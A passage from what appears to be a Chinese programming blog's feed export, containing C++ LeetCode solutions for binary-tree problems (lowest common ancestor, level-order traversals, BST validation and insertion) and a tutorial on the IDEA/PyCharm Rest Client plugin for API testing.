class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="236-二叉树的最近公共祖先"><a href="#236-二叉树的最近公共祖先" class="headerlink" title="236. 二叉树的最近公共祖先"></a><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/">236. 二叉树的最近公共祖先</a></h5><blockquote><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p><p><a href="https://baike.baidu.com/item/%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/8918834?fr=aladdin">百度百科</a>中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p><p>例如，给定如下二叉树: root = [3,5,1,6,2,0,8,null,null,7,4]</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49261/binarytree.png" alt="img"></p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1</span><br><span class="line">输出: 3</span><br><span class="line">解释: 节点 5 和节点 1 的最近公共祖先是节点 3。</span><br></pre></td></tr></tbody></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4</span><br><span class="line">输出: 5</span><br><span class="line">解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></tbody></table></figure></blockquote><p>思路：分治法，有左子树的公共祖先或者有右子树的公共祖先，就返回子树的祖先，否则返回根节点</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">         <span class="comment">// 相等 直接返回root节点即可</span></span><br><span class="line">        <span class="keyword">if</span>(root==p||root==q)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">auto</span> left=<span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">        <span class="keyword">auto</span> right=<span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">          <span class="comment">// 左右两边都不为空，则根节点为祖先</span></span><br><span class="line">        <span class="keyword">if</span>(left!=<span class="literal">NULL</span>&amp;&amp;right!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span>(left!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        <span class="keyword">if</span>(right!=<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="BFS-层次应用"><a href="#BFS-层次应用" class="headerlink" title="BFS 层次应用"></a>BFS 层次应用</h3><h5 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h5><blockquote><p>给你一个二叉树，请你返回其按 <strong>层序遍历</strong> 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">           <span class="type">int</span> currentLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">           vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLevelSize;i++)</span><br><span class="line">           {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                level.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);               </span><br><span class="line">           }</span><br><span class="line">           res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="107-二叉树的层次遍历-II"><a href="#107-二叉树的层次遍历-II" class="headerlink" title="107. 二叉树的层次遍历 II"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal-ii/">107. 二叉树的层次遍历 II</a></h5><blockquote><p>给定一个二叉树，返回其节点值自底向上的层次遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）</p></blockquote><p>思路：在层级遍历的基础上，翻转一下结果即可</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrderBottom</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode*&gt;q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="type">int</span> curLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; curLevel;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;curLevelSize;i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                curLevel.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)            </span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);</span><br><span class="line">                </span><br><span class="line">            }</span><br><span class="line">            res.<span class="built_in">push_back</span>(curLevel);</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="103-二叉树的锯齿形层次遍历"><a href="#103-二叉树的锯齿形层次遍历" class="headerlink" title="103. 二叉树的锯齿形层次遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal/">103. 二叉树的锯齿形层次遍历</a></h5><blockquote><p>给定一个二叉树，返回其节点值的锯齿形层次遍历。（即先从左往右，再从右往左进行下一层遍历，以此类推，层与层之间交替进行）。</p><p>例如：<br>给定二叉树 [3,9,20,null,null,15,7],</p><p> 3<br>/ <br>9  20<br> /  <br>15   7<br>返回锯齿形层次遍历如下：</p><p>[<br>[3],<br>[20,9],<br>[15,7]<br>]</p></blockquote><p>思路：特定层结果翻转即可</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">zigzagLevelOrder</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="type">bool</span> toggle=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="type">int</span> curLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; curLevel;            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;curLevelSize;i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                curLevel.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);                               </span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(toggle)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">reverse</span>(curLevel.<span class="built_in">begin</span>(),curLevel.<span class="built_in">end</span>());</span><br><span class="line">            }               </span><br><span class="line">            toggle=!toggle;</span><br><span class="line">            res.<span class="built_in">push_back</span>(curLevel);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="二叉搜索树应用"><a href="#二叉搜索树应用" class="headerlink" title="二叉搜索树应用"></a>二叉搜索树应用</h3><h5 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h5><blockquote><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p><p>假设一个二叉搜索树具有如下特征：</p><p>节点的左子树只包含小于当前节点的数。<br>节点的右子树只包含大于当前节点的数。<br>所有左子树和右子树自身必须也是二叉搜索树。</p></blockquote><h6 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h6><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt;res;</span><br><span class="line">        <span class="built_in">inOrder</span>(root,res);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;res.<span class="built_in">size</span>()<span class="number">-1</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(res[i]&gt;=res[i<span class="number">+1</span>])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inOrder</span><span class="params">(TreeNode*root,vector&lt;<span class="type">int</span>&gt; &amp;res)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inOrder</span>(root-&gt;left,res);</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">inOrder</span>(root-&gt;right,res);</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="701-二叉搜索树中的插入操作"><a href="#701-二叉搜索树中的插入操作" class="headerlink" title="701. 二叉搜索树中的插入操作"></a><a href="https://leetcode-cn.com/problems/insert-into-a-binary-search-tree/">701. 二叉搜索树中的插入操作</a></h5><blockquote><p>给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 保证原始二叉搜索树中不存在新值。</p><p>注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回任意有效的结果。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">insertIntoBST</span><span class="params">(TreeNode* root, <span class="type">int</span> val)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">TreeNode</span>(val);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val&lt;val)</span><br><span class="line">        {</span><br><span class="line">            root-&gt;right=<span class="built_in">insertIntoBST</span>(root-&gt;right,val);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            root-&gt;left=<span class="built_in">insertIntoBST</span>(root-&gt;left,val);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rest Client在idea的使用</title>
      <link href="/posts/34566/"/>
      <url>/posts/34566/</url>
      
        <content type="html"><![CDATA[<h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><p><strong>首先，打开IntelliJ IDEA或pycharm，安装Rest Client。</strong></p><p><strong>File -&gt; Setting -&gt; Plug-ins -&gt; Browse Repository</strong></p><p>搜索Rest Client，点击右侧的install，稍等片刻会提醒要重启IDEA，重启后安装结束。</p><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><p>使用时候，从顶层工具栏依次Tools -&gt; HTTP Client -&gt; Test RESTFUL Web Service 打开</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/dc6420f5bfcb4f0caaa4612c0a77f7da.jpeg"></p><p><strong>之后，IDEA REST Client控制台的界面如下样子。</strong></p><p>这个控制台展示的功能区有请求方式，请求参数和请求头的填充等等。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/72bfdacadd0e4f18b6041bd1531f5246.jpeg"></p><p>如果需要用户名、密码验证，点击右侧按钮，会弹出填充用户名和密码的窗口。</p><p>填完后会自动补充到Authorization 的header里面去。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/1ee7661ac0c948cdb46de50b7ee701fb.jpeg"></p><p>Rest Client插件会自动将最近执行的50个请求保存到http-requests-log.http 文件中。</p><p>该文件存储在项目的.idea /httpRequests/目录下。</p><p>使用请求历史记录，用户可以快速导航到特定响应并再次发出请求。</p><p><strong>除了构建请求，发起RESTful请求，Rest Client插件还可以完成如下postman不能做到的功能：</strong></p><p>• 模板构建请求；</p><p>• 多个环境区分；</p><p>• 结果断言；</p><p>• 结果暂存；</p><h5 id="添加-token"><a href="#添加-token" class="headerlink" title="添加 token"></a>添加 token</h5><h4 id="3-pycharm中测试结果断言及生成测试报告"><a href="#3-pycharm中测试结果断言及生成测试报告" class="headerlink" title="3.pycharm中测试结果断言及生成测试报告"></a>3.pycharm中测试结果断言及生成测试报告</h4><p>先进入rest client插件界面，从顶层工具栏依次Tools -&gt; HTTP Client -&gt; Test RESTFUL Web Service 打开后， REST Client控制台的界面如下样式：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/e4cddce1ca634475b9c60c99d4949842.jpeg"></p><p>点一下右上方的“Convert request to the new format”，接口请求各个参数自动生成一个配置文件，在IDE上边文件编辑框内。</p><p>文件名为：rest-api.http，默认存放在.PyCharm2019.2configscratches。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/87fe1df9a7594e0b9dedcaafe28cf4ba.jpeg"></p><h5 id="测试结果断言设置"><a href="#测试结果断言设置" class="headerlink" title="测试结果断言设置"></a>测试结果断言设置</h5><p>把上面生成的rest-api.http文件内容都删除，重新写入如下内容：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/03f790e427ce4af3abcdc93bad4d8dea.jpeg"></p><blockquote><p>解释：</p><ol><li><p>client.test，表示下面的是一个测试用例，第一个参数是测试用例名字，第二个参数是一个函数包含着测试断言。</p></li><li><p>断言由client.assert带出，第一个参数是判断条件，第二个参数是测试失败时候战士的信息。</p></li></ol><p>鼠标移动到“GET”右侧的按钮，会出现“Run httpbin.org”（Run 后面的是测试接口的链接）</p></blockquote><p>点击弹出的标签，测试执行。Console界面自动展示出执行结果。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/e6212321bc724d0bb5ad515363c23078.jpeg"></p><p>点击“Console”标签右侧的“test”标签，可以看到具体执行结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/47d61cd6209a4e2288fe86169fd955ab.jpeg"></p><h5 id="自己写一个测试用例和断言"><a href="#自己写一个测试用例和断言" class="headerlink" title="自己写一个测试用例和断言"></a>自己写一个测试用例和断言</h5><p>仿照上面的例子，写一个测试用例和断言，判断response的headers里面的某一个字段。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/b1a3ea4dcf8b4ea6b02b908afbf51d88.jpeg"></p><p>还是像上面那样执行测试用例。</p><p>“console”标签没变化，但是右侧的“test”标签内容很不一样了。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/90287850460349e19903cd6c0a7adbaf.jpeg"></p><p>两个测试用例都通过。</p><h5 id="生成检测报告"><a href="#生成检测报告" class="headerlink" title="生成检测报告"></a>生成检测报告</h5><p>在“test”标签里，点击“Export Test Result”，可以将测试结果导出成测试报告</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/ef48152bb3804fae962dcab4f3997776.jpeg"></p><p>在弹出对话框中，保存测试报告到指定位置。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/34566/1c9196e4ae9a431b919a378bfe83c033.jpeg"></p><p>测试报告：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 